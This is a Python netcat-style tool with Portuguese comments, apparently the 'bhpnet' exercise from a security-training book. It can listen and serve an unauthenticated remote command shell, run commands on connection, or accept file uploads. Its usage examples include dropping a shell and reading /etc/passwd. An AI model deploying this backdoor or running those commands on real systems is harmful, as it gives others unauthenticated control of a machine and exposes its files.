import sys
import socket
import getopt
import threading
import subprocess
# python bhpnet.py -l -p 9999 -c  <=== Inicia o Servidor
# python bhpnet.py -t 127.0.0.1 -p 9999 <=== Incia o Client

# Variáveis globais
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

def usage():
    print("Ferramenta Net BHP")
    print()
    print("Uso: bhpnet.py -t target_host -p port")
    print("-l --listen              - Escutar em [host]:[port] para conexões de entrada")
    print("-e --execute=file_to_run - Executar o arquivo fornecido ao receber uma conexão")
    print("-c --command             - Inicializar um shell de comando")
    print("-u --upload=destination  - Ao receber conexão, carregar um arquivo e gravar em [destino]")
    print()
    print("Exemplos:")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGH' | ./bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # Ler as opções de linha de comando
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", 
                                   ["help", "listen", "execute=", "target=", "port=", "command", "upload="])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Opção não tratada"

    # Não estamos ouvindo, então enviamos dados de stdin
    if not listen and len(target) and port > 0:
        # Lido no buffer a partir da linha de comando
        # Isto irá bloquear, então envie CTRL-D se não estiver enviando entrada
        buffer = sys.stdin.read()

        # Enviar dados
        client_sender(buffer)

    # Vamos escutar e, potencialmente, fazer upload, executar comandos ou soltar um shell
    # Dependendo de nossas opções de linha de comando acima
    if listen:
        server_loop()

def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Conectar ao nosso host de destino
        print(f"[*] Tentando conectar a {target}:{port}")
        client.connect((target, port))

        if len(buffer):
            client.send(buffer.encode())

        while True:
            # Agora esperar por dados de volta
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data.decode('utf-8')

                if recv_len < 4096:
                    break

            print(f"[*] Recebido: {response}")

            # Espera por mais entrada
            buffer = input("> ")
            buffer += "\n"

            # Enviar para o servidor
            client.send(buffer.encode())

    except Exception as e:
        print(f"[*] Exceção! Saindo... {e}")

    finally:
        # Derrubar a conexão
        client.close()

def server_loop():
    global target

    # Se nenhum alvo for definido, escutamos em todas as interfaces
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    print(f"[*] Ouvindo em {target}:{port}")

    while True:
        client_socket, addr = server.accept()
        print(f"[*] Conexão de {addr[0]}:{addr[1]}")

        # Criar uma thread para lidar com o cliente
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

def run_command(command):
    # Remover quebras de linha
    command = command.rstrip()

    # Executar o comando e retornar a saída
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except subprocess.CalledProcessError as e:
        output = e.output

    return output.decode()

def client_handler(client_socket):
    global upload
    global execute
    global command

    # Verifica se há um upload
    if len(upload_destination):
        # Lê todos os bytes e grava no destino
        file_buffer = b""

        # Continuar lendo dados até não ter mais disponíveis
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data

        # Agora escrevemos esses bytes no arquivo
        try:
            with open(upload_destination, "wb") as f:
                f.write(file_buffer)

            client_socket.send(f"Arquivo salvo com sucesso em {upload_destination}\r\n".encode())

        except:
            client_socket.send(f"Falha ao salvar o arquivo em {upload_destination}\r\n".encode())

    # Verifica se há um comando para ser executado
    if len(execute):
        # Executa o comando
        output = run_command(execute)
        client_socket.send(output.encode())

    # Se um shell foi requisitado, entramos em loop
    if command:
        while True:
            # Envia um prompt
            client_socket.send(b"<BHP: #> ")

            # Recebe até ver uma nova linha (enter)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode()

            # Envia de volta a saída do comando
            response = run_command(cmd_buffer)
            client_socket.send(response.encode())

if __name__ == "__main__":
    main()

